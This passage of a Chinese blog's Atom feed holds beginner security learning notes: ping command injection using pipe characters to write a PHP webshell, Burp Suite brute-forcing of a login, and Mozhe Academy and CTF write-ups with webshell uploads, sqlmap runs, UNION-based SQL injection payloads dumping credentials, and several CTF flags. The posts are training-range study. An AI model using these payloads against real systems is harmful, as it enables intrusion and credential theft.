    <content type="html"><![CDATA[<p>在ping的地址后利用管道符|，||，&amp;，&amp;&amp;进行命令执行</p><p>例如127.0.0.1&amp;&amp;ls</p><p>利用<code>127.0.0.1&amp;&amp;echo &#39;一句话&#39; &gt;1.php</code>       将自己的马写到1.php中</p><p>&amp;&amp;后跟命令</p><p>比如重命名文件命令 <code>127.0.0.1&amp;&amp;mv 1.txt 1.php</code>将1.txt重命名为1.php</p><p><img src="/2020/01/01/%E7%AE%A1%E9%81%93%E7%AC%A6%E6%BC%8F%E6%B4%9E/QQ%E5%9B%BE%E7%89%8720200101010852.png" alt="QQ图片20200101010852"></p><p>冲鸭，2020第一天！！！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在ping的地址后利用管道符|，||，&amp;amp;，&amp;amp;&amp;amp;进行命令执行&lt;/p&gt;
&lt;p&gt;例如127.0.0.1&amp;amp;&amp;amp;ls&lt;/p&gt;
&lt;p&gt;利用&lt;code&gt;127.0.0.1&amp;amp;&amp;amp;echo &amp;#39;一句话&amp;#39; &amp;gt;1.php&lt;/
      
    
    </summary>
    
    
    
      <category term="linux" scheme="http://lingxin16.github.io/tags/linux/"/>
    
      <category term="管道符" scheme="http://lingxin16.github.io/tags/%E7%AE%A1%E9%81%93%E7%AC%A6/"/>
    
  </entry>
  
  <entry>
    <title>burp爆破</title>
    <link href="http://lingxin16.github.io/2019/12/19/burp%E7%88%86%E7%A0%B4/"/>
    <id>http://lingxin16.github.io/2019/12/19/burp%E7%88%86%E7%A0%B4/</id>
    <published>2019-12-19T15:49:45.000Z</published>
    <updated>2019-12-20T09:04:39.991Z</updated>
    
    <content type="html"><![CDATA[<p>用burpsuit对网页上的一些用户名密码之类的爆破</p><p>这里就用墨者学院文件包含那道题的那个登录页面吧…</p><p><img src="/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191219235640.png" alt="QQ截图20191219235640"></p> <a id="more"></a><p>设置代理 先用burp抓取</p><p><img src="/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191219235847.png" alt="QQ截图20191219235847"></p><p>黑色圈住的就是用户名和密码的函数(应该是叫函数吧…..)  红色圈住的就是之前自己输入的账号和密码</p><p>能看到是明文密码 然后send to intruder</p><p><img src="/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191220000053.png" alt="QQ截图20191220000053"></p><p>这里他实现标记了要爆破的位置 不是我们要爆破的位置 我们先用上边的clear把标记清除</p><p><img src="/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191220000358.png" alt="QQ截图20191220000358"></p><p>然后选中要爆破的地址 这里都是admin前边那个是我输入的账号后边的是密码  然后点击add分别添加</p><p><img src="/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191220002421.png" alt="QQ截图20191220000524"></p><p>在attack type那里选择cluster bomb</p><p><img src="/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191220000929.png" alt="QQ截图20191220000929"></p><p>转到payloads那边</p><p><img src="/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191220001013.png" alt="QQ截图20191220001013"></p><p>看到payload set 右边下拉发现有1,2分别是我们刚刚添加的两个地址</p><p>下边方框右边的add是手动添加账号密码 有字典的话点load载入字典</p><p>添加完成后选择intruder→start attack</p><p><img src="/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191220001248.png" alt="QQ截图20191220001248"></p><p>然后找到length里边那个长度不一样的就是我们要的账号密码</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用burpsuit对网页上的一些用户名密码之类的爆破&lt;/p&gt;
&lt;p&gt;这里就用墨者学院文件包含那道题的那个登录页面吧…&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191219235640.png&quot; alt=&quot;QQ截图20191219235640&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="burpsuit" scheme="http://lingxin16.github.io/tags/burpsuit/"/>
    
  </entry>
  
  <entry>
    <title>墨者学院</title>
    <link href="http://lingxin16.github.io/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"/>
    <id>http://lingxin16.github.io/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/</id>
    <published>2019-12-06T13:40:08.000Z</published>
    <updated>2019-12-14T07:56:45.707Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内部文件上传系统漏洞分析溯源"><a href="#内部文件上传系统漏洞分析溯源" class="headerlink" title="内部文件上传系统漏洞分析溯源"></a>内部文件上传系统漏洞分析溯源</h1><p>上传asp一句话木马</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191202192741.png" alt="QQ截图20191202192741"></p><p>burp抓包修改文件上传路径  在.asp后缀的文件夹中 文件被默认为asp类型执行</p><a id="more"></a><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191202192630.png" alt="QQ截图20191202192630"></p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191202192639.png" alt="QQ截图20191202192639"></p><p>蚁剑链接</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191202192555.png" alt="QQ截图20191202192555"></p><h1 id="phpMyAdmin后台文件包含分析溯源"><a href="#phpMyAdmin后台文件包含分析溯源" class="headerlink" title="phpMyAdmin后台文件包含分析溯源"></a>phpMyAdmin后台文件包含分析溯源</h1><p>密码弱口令root登录</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191206215606.png" alt="QQ截图20191206215606"></p><p>sql注入一句话</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191206215818.png" alt="QQ截图20191206215818"></p><p>蚁剑链接  根目录找到key文件</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191206220106.png" alt="QQ截图20191206220106"></p><p>得到key:mozhe6e0dc3709254b6732421f373dce</p><h1 id="SQL注入漏洞测试-布尔盲注"><a href="#SQL注入漏洞测试-布尔盲注" class="headerlink" title="SQL注入漏洞测试(布尔盲注)"></a>SQL注入漏洞测试(布尔盲注)</h1><p>打开靶场,找到停机维护通知页面</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210212136.png" alt="QQ截图20191210212136"></p><p>用sqlmap爆当前库</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210212056.png" alt="QQ截图20191210212056"></p><p>获取到数据库名stormgroup</p><p>然后爆表段</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210212751.png" alt="QQ截图20191210212751"></p><p>获取到表member和notice</p><p>然后爆字段 得到 name password 和status</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210213301.png" alt="QQ截图20191210213301"></p><p>然后分别猜解name和password</p><p>得到name为mozhe password需要md5解码</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210213913.png" alt="QQ截图20191210213913"></p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210213750.png" alt="QQ截图20191210213750"></p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210214158.png" alt="QQ截图20191210214158"></p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210213734.png" alt="QQ截图20191210213734"></p><p>第一个没办法登录 用第二个密码才登录成功,得到key</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210214029.png" alt="QQ截图20191210214029"></p><h1 id="SQL手工注入漏洞测试-MySQL数据库-字符型"><a href="#SQL手工注入漏洞测试-MySQL数据库-字符型" class="headerlink" title="SQL手工注入漏洞测试(MySQL数据库-字符型)"></a>SQL手工注入漏洞测试(MySQL数据库-字符型)</h1><p>先打开靶场 找到注入页面</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191211165444.png" alt="QQ截图20191211165444"></p><p><a href="http://219.153.49.228:45556/new_list.php?id=tingjigonggao后加上&#39;and" target="_blank" rel="noopener">http://219.153.49.228:45556/new_list.php?id=tingjigonggao后加上&#39;and</a> 1 = 1–+ 发现页面打开正常</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191211170335.png" alt="QQ截图20191211170335"></p><p>判断为字符型注入 其实题目已经说明了是字符型注入…</p><p>然后获取列表的字段数 后边加上’order by 1–+</p><p>将1分别替换为2,3,4,5发现为5的时候显示不正常  那么字段数最大应该为4</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191211170717.png" alt="QQ截图20191211170717"></p><p>然后判断回显位置 将=后改为’ union select 1,2,3,4 –+  得到回显位置为2和3</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191211172802.png" alt="QQ截图20191211172802"></p><p>然后获取数据库名  将=后改为’ union select 1,database(),3,4 –+  得到数据库名mozhe_discuz_stormgroup</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191211172640.png" alt="QQ截图20191211172640"></p><p>接着获取表 =后为’ union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database() and ‘1’=’1  得到两个表notice,stormgroup_member</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191211172721.png" alt="QQ截图20191211172721"></p><p>接着获取字段  =后为’ union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=’stormgroup_member’ and ‘1’=’1   得到四个字段</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191211172958.png" alt="QQ截图20191211172958"></p><p>最后就是查询字段name和password的值   =后为’ union select 1,name,password,4 from stormgroup_member where’1’=’1#</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191211174645.png" alt="QQ截图20191211174645"></p><p>md5解码后登录</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;内部文件上传系统漏洞分析溯源&quot;&gt;&lt;a href=&quot;#内部文件上传系统漏洞分析溯源&quot; class=&quot;headerlink&quot; title=&quot;内部文件上传系统漏洞分析溯源&quot;&gt;&lt;/a&gt;内部文件上传系统漏洞分析溯源&lt;/h1&gt;&lt;p&gt;上传asp一句话木马&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191202192741.png&quot; alt=&quot;QQ截图20191202192741&quot;&gt;&lt;/p&gt;
&lt;p&gt;burp抓包修改文件上传路径  在.asp后缀的文件夹中 文件被默认为asp类型执行&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="writeup" scheme="http://lingxin16.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>write up</title>
    <link href="http://lingxin16.github.io/2019/12/05/write-up/"/>
    <id>http://lingxin16.github.io/2019/12/05/write-up/</id>
    <published>2019-12-05T13:11:14.000Z</published>
    <updated>2020-01-31T17:52:01.482Z</updated>
    
    <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h2 id="圣堂刺客"><a href="#圣堂刺客" class="headerlink" title="圣堂刺客"></a>圣堂刺客</h2><p>下载 拖入文本 找到flag ： AGCTF{MetaData_1s_Important}</p><a id="more"></a><p><img src="/2019/12/05/write-up/20191122192540517.jpg" alt="20191122192540517"></p><h2 id="奥利安娜的QQ号"><a href="#奥利安娜的QQ号" class="headerlink" title="奥利安娜的QQ号"></a>奥利安娜的QQ号</h2><p>直接百度!</p><p><img src="/2019/12/05/write-up/20191122193129505.jpg" alt="20191122193129505"></p><h2 id="多喝水"><a href="#多喝水" class="headerlink" title="多喝水"></a>多喝水</h2><p>图片下载下来 拖入文本 得到</p><p><img src="/2019/12/05/write-up/20191122193920451.jpg" alt="20191122193920451"></p><p>QUdDVEYlN0JwMWVhczNfZHIxbmtfbTByZV93YXQzciU3RA==<br>放进base64解码得AGCTF%7Bp1eas3_dr1nk_m0re_wat3r%7D<br>%7B和%7D换成{ }</p><h2 id="帅帅帅"><a href="#帅帅帅" class="headerlink" title="帅帅帅"></a>帅帅帅</h2><p>下载html文件 打开没有发现flag 查看源代码</p><p><img src="/2019/12/05/write-up/20191122194200468.jpg" alt="20191122194200468"></p><h2 id="Easy-Misc"><a href="#Easy-Misc" class="headerlink" title="Easy_Misc"></a>Easy_Misc</h2><p>弱口令直接用字典爆破 得到密码password<br>解压出图片 后缀改为rar 解压得到视频，提取二维码补齐定位点，</p><p><img src="/2019/12/05/write-up/20191122204627566.png" alt="20191122204627566"></p><p>扫码得到flag：flag{e7d478cf6b915f50ab1277f78502a2c5}将里边的字符MD5解码得到hello_ctf</p><h2 id="玩具车"><a href="#玩具车" class="headerlink" title="玩具车"></a>玩具车</h2><h2 id="可以直接拖入记事本得到flag"><a href="#可以直接拖入记事本得到flag" class="headerlink" title="可以直接拖入记事本得到flag"></a>可以直接拖入记事本得到flag</h2><p><img src="/2019/12/05/write-up/20191122194834546.jpg" alt="20191122194834546"></p><h2 id="Easy-RE"><a href="#Easy-RE" class="headerlink" title="Easy_RE"></a>Easy_RE</h2><p>用ida打开 f5查看代码，r键转换字符，得到flag</p><p><img src="/2019/12/05/write-up/20191122204437442.png" alt="20191122204437442"></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>既然是逆向 就先用ida打开 (需要注意一下ida和ida64的区别 这1个有的能查看C语言伪代码,这个题是ida)</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212200915.png" alt="QQ截图20191212200915"></p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212200925.png" alt="QQ截图20191212200925"></p><p>在main函数中没有发现什么 但是下边的main_0中可以看到一些东西 </p><p>大概意思就是前边一串东西加上40之后等于后边的一串 此时则输出ok</p><p>接着看那一团byte什么的双击之后看到</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212201745.png" alt="QQ截图20191212201745"></p><p>通过询问大佬得知是16进制数 那我们就需要把他转化成十进制 再运算之后输出ascill形式</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212204354.png" alt="QQ截图20191212204354"></p><p>得到flag :AGCTF{Easy_Hex}</p><h2 id="这是个gif"><a href="#这是个gif" class="headerlink" title="这是个gif"></a>这是个gif</h2><p>把gif文件下载下来 发现怎么都没有办法打开,排除是隐写,没有办法,放到winhex里看一下,并没有发现GIF文件标记(只因我没有看到gif这三个字母….)</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212195829.png" alt="QQ截图20191212195829"></p><p>百度gif文件  发现GIF87a和GIF89a两个版本</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212200020.png" alt="QQ截图20191212200020"></p><p>正好这个文件在winhex中打开开头是89a  然后百度gif文件头</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212200238.png" alt="QQ截图20191212200238"></p><p>对比发现是文件头缺失 然后就在winhex中补齐</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212200503.png" alt="QQ截图20191212200503"></p><p>保存后发现是个gif文件 在ps中打开查看gif那一帧  得到flag</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212200604.png" alt="QQ截图20191212200604"></p><h2 id="re-xor"><a href="#re-xor" class="headerlink" title="re_xor"></a>re_xor</h2><p>这个是用ida64才能打开查看C语言伪代码的</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212205442.png" alt="QQ截图20191212205442"></p><p>f5查看伪代码 </p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212205800.png" alt="QQ截图20191212205800"></p><p>发现有个地方看不懂   ^这个符号 在C语言中表示什么呢….</p><p>上网搜一下 C语言 ^</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212210008.png" alt="QQ截图20191212210008"></p><p>emm..位异或  题目xor也表明了这个题跟异或有关</p><p>搜一下异或 有一大堆看不太懂的东西  </p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212210214.png" alt="QQ截图20191212210214"></p><p>这个大概就是当^前后相等时 表示0 不等是则是1  </p><p>还是重新看源代码吧…</p><p>写个脚本算一算 这里就直接用异或那个符号了 也省的理解那么多…</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212211701.png" alt="QQ截图20191212211701"></p><p>得到flag AGCTF{Happy_x0r}</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;h2 id=&quot;圣堂刺客&quot;&gt;&lt;a href=&quot;#圣堂刺客&quot; class=&quot;headerlink&quot; title=&quot;圣堂刺客&quot;&gt;&lt;/a&gt;圣堂刺客&lt;/h2&gt;&lt;p&gt;下载 拖入文本 找到flag ： AGCTF{MetaData_1s_Important}&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="writeup" scheme="http://lingxin16.github.io/tags/writeup/"/>
    
  </entry>
  
</feed>
